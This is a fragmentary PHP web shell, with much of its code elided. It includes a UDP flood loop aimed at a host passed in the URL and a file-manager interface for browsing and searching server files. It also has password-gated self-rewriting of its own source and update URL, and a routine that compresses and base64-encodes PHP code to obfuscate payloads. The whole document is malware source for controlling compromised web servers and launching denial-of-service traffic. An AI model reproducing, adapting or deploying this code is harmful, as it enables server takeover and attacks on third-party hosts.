...
if (isset($_GET['host']) && isset($_GET['time'])) {
    ...
    while (1) {
        ...
        $fp = fsockopen('udp://' . $_GET['host'], $rand, $errno, $errstr, 5);
        if ($fp) {
            $feather($fp, $out);
            $pixel($fp);
        }
...
function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage) {
...
function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage) {
	if(!action) return;
	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage);
	window.onbeforeunload = null;
	$(\'opform\').submit();
}
</script>
...
';
  ...
  if($p1) {
    ...
    makeselect(array('name' => 'findin',
        ...
        'selected' => $findin,
        'nokey' => 1));
    p('<input name="dir" value="' . $dir . '" type="hidden" /> <input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular expressions</form></div></td></tr>');
   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',null,\'s_filename_'.($sort[1]?0:1).'\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
	p('<td width="16%"><a href="javascript:g(\'file\',null,\'s_mtime_'.($sort[1]?0:1).'\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
	p('<td width="10%"><a href="javascript:g(\'file\',null,\'s_size_'.($sort[1]?0:1).'\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
    ...
    if ($view_writable == 'dir') {
        ...
        while ($file = @readdir($dirs)) {
            if ($findstr){
                ...
                if ($re){
                    if ($infile){
                        if (!$prgm('@' . $findstr . '@', @file_get_contents($nowpath . $file))) continue;
                    }else{
                        if (!$prgm('@' . $findstr . '@', $file)) continue;
                    }
                }else{
                    if ($infile){
                        if (!(strpos(@file_get_contents($nowpath . $file), $findstr) !== FALSE)) continue;
                    }else{
  ...
  if (!empty($dirdata)){
    ...
    foreach ($filedata as $key => $filedb) {
        if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
            ...
            p('<td>' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="' . (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . (str_replace("//", "/", "/" . $fileurl)) . '" target="_blank">' . $filedb['filename'] . '</a>' : $filedb['filename']) . '</td>');
	...
	if (isset($setpass) && isset($setpass2)){
		if (($setpass2 == $setpass)){
			if((md5($curpass) == $pass)){
				$newv = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
	...
	if (isset($setcfuu)){
		...
		$newv = $prg("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$checkforupdatesurl = \"" . $setcfuu . "\";",$newv);
...
<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
    ...
    if (isset($code) && $code != "") {
        $encoded = base64_encode(bzcompress(trim(stripslashes($code . ' '), '<?php,?>,<?,<?PHP,<?Php,<?PHp,<?pHp,<?pHP,<?phP'), 9)); // high Compression! :P
...
{
    global $self, $nowpath;
    p('<form action="' . $self . '" method="post" onSubmit="window.onbeforeunload = null;"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $nowpath . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
}
function formfoot()
{
    p('</form>');
